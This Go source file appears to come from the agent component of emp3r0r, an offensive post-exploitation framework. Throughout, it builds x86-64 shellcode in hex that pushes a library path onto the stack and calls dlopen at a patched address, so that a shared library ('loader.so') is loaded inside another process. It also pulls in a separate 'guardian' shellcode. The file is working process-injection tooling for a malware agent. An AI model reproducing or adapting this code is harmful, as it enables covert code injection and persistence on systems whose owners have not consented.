package agent

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"strings"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var (
	dlopen_shellcode = "31f0" + "31ff" + "31f6" +
		"31d2" + "31c9" + "31db" + // clear rax, rdi, rsi
		"57" + // push rdi '\0'
		// filename is path to loader.so
		// to be replaced with
		// movabs rdi, 0xdeadbeefdeadbeef; push rdi
		// opcode is 48bfdeadbeefdeadbeef; 57
		"filename" +
		// "cc" + // int3
		"40b602" + // mov sil, 2; mode=2
		"48b830d9320c047f0000" +
		// "cc" + // int3
		"ffd0" + // movabs rax, 0x7f040c32d930; call rax
		"cc" // int3
	guardian_shellcode = emp3r0r_data.GuardianShellcode
)

// dlopen_addr: eg. 30d9320c047f
// path: eg. /usr/lib/x86_64-linux-gnu/libc++.so.1
func gen_dlopen_shellcode(path string, dlopen_addr int64) (shelcode string) {
	b := make([]byte, 8)
	binary.LittleEndian.PutUint64(b, uint64(dlopen_addr))
	dlopen_addr_hex := hex.EncodeToString(b)
	push_filename_hex := push_filename_asm(path)
	if push_filename_hex == "" {
		log.Printf("push_filename_asm failed")
		return
	}

	s1 := strings.ReplaceAll(dlopen_shellcode, "filename", push_filename_hex)
	shelcode = strings.ReplaceAll(s1, "30d9320c047f0000", dlopen_addr_hex)
	log.Printf("gen_dlopen_shellcode:\n%s", shelcode)

	return
}

// generates instructions that pushes filename to stack
// and assign to rdi as function parameter
func push_filename_asm(path string) (ret_hex string) {
	path_hex := ""
	if len(path) <= 8 {
		path_hex = hex.EncodeToString([]byte(path))
		ret_hex = "48bf" + path_hex + "57" // movabs rdi, so_path_hex; push rdi
		ret_hex += "4889e7"                // mov rdi, rsp

	} else {
		path_str := "" // hex string can't be easily reversed
		for _, char := range util.ReverseString(path) {
			c := string(char)
			if len(path_str) == 8 {
				r := util.ReverseString(path_str)
				path_hex = hex.EncodeToString([]byte(r))
				ret_hex += "48bf" + path_hex + "57" // movabs rdi, path_hex; push rdi
				path_str = ""
			}
			path_str += c
		}

		// remaining chars
		r := util.ReverseString(path_str)
		path_hex = hex.EncodeToString([]byte(r))
	}

	// pad the remaining bytes
	if len(path_hex)/2 < 8 {
		padding := 8 - len(path_hex)/2     // number of paddings using NULL
		padding_b := []byte{byte(padding)} // number of NULLs used for padding, in hex format
		path_hex = fmt.Sprintf("%s%s", strings.Repeat("00", padding), path_hex)
		ret_hex += "48bf" + path_hex + "57"
		ret_hex += fmt.Sprintf("4883c4%s", hex.EncodeToString(padding_b)) // add rsp, padding
	}
	ret_hex += "4889e7" // mov rdi, rsp

	return
}
